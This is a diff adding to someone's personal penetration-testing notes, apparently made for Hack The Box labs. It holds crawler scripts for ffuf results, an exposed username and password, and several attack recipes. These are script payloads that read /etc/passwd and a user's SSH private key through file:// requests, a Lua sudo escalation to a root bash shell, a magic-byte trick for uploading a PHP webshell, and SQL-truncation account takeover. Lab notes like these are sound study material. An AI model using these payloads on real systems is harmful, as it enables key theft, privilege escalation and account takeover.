@@ -91,3 +91,149 @@ may need to do from kali box, and ensure it is run from /home directores not .tm
 https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/
 
 "Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }
+
+
+==============================
+
+execute last command 
+!!
+r sudo !!o
+
+tool usage list:
+ffuff 
+
+how to use bloodhound and neo4j with sharphound (using winrm to download upload etc) on the site
+
+best wordlists
+
+pspy tool
+
+===========================================================
+script to scrape info from results.txt
+
+import requests
+from bs4 import BeautifulSoup
+
+def scrape_links(url):
+    # Send a GET request to the page
+    response = requests.get(url)
+    # Parse the HTML content
+    soup = BeautifulSoup(response.text, 'html.parser')
+    # Find all <a> tags
+    links = soup.find_all('a')
+    return links
+
+def main():
+    # Open the results file
+    with open("results.txt", "r") as file:
+        # Read each line of the file
+        for line in file:
+            links = scrape_links(line.strip())
+            # Iterate over the links
+            for link in links:
+                # Print the link's href attribute
+                print(link.get('href'))
+
+if __name__ == "__main__":
+    main()
+----------------------------------
+FROM HTB:
+
+#!/usr/bin/python
+import sys
+import json
+import requests
+import argparse
+from bs4 import BeautifulSoup
+
+def results(file):
+	content=open(file,'r').readlines()
+	for line in content:
+		data=json.loads(line.strip())
+	urls=[]
+	for url in data['results']:
+		urls.append(url['url'])
+	return urls
+def crawl(url):
+	r = requests.get(url)
+	soup = BeautifulSoup(r.text,'lxml')
+	links = soup.findAll('a',href=True)
+	for link in links:
+		link=link['href']
+		if link and link!='#':
+		print '[+] {} : {}'.format(url,link)
+if __name__=="__main__":
+	parser = argparse.ArgumentParser()
+	parser.add_argument("file",help="ffuf results")
+	args = parser.parse_args()
+	urls=results(args.file)
+	for url in urls:
+		crawl(url)
+
+
+
+#### use this script, if you want to extract info (as in exported) so you have  system which you can enter this
+and then export it to get what you need
+
+<script>
+var x = new XMLHttpRequest();
+x.open("GET", "file:///etc/passwd", true);
+x.onload = function(){
+document.write(x.responseText);
+};
+x.send();
+</script>
+
+##### As above but to get the base64 encoded SSH key
+<script>
+var x = new XMLHttpRequest();
+x.open("GET", "file:///home/reader/.ssh/id_rsa", true);
+x.onload = function(){
+var code = "<textarea rows='100' cols='70'>" + btoa(x.responseText) + "
+</textarea>";
+document.write(code);
+};
+x.send();
+</script>
+
+
+
+===================================
+===================================
+Scenarios:
+
+#Deleted file by admin
+
+.bash_history - reveals a file which has now been deleted (sudo -u sysadmin /home/syadmin/luvit privesc.ua)
+sudo -l - reveals we can run root for certain software which execute lua code
+
+echo "require('os');" > priv.lua
+echo "os.execute('/bin/bash');" >> priv.lua
+
+
+#uploading tool to server
+
+sudo mv pspy64 /var/www/html
+sudo service apache2 start
+
+# backgrounding a shell
+you can create a shell code and use & to background during SSH. Prevents other users been blocked
+
+
+#Magic bytes
+you attempt to upload a file abc.php.jpg
+- gets flagged up immediately
+way around it: 
+get the magic bytes from a .jpg image (xxd image.jpg | head)
+add these to start of our abc.php.jpg
+echo 'FFD8FFDB' | xxd -r -p > webshell.php.jpg
+
+then upload
+
+
+### SQL Truncation
+-from burp sending a username more than what is permitted
+- so we enter loads of spaces around admin and then url encode
+- this works as according to MySQL documentation, trailing spaces are ingnored 
+- so register account using admin@test.abc then catch request
+- so now if we have an email of admin: admin@abc.abc add in many spaces after (admin@abc.abc++++++++++++++test)
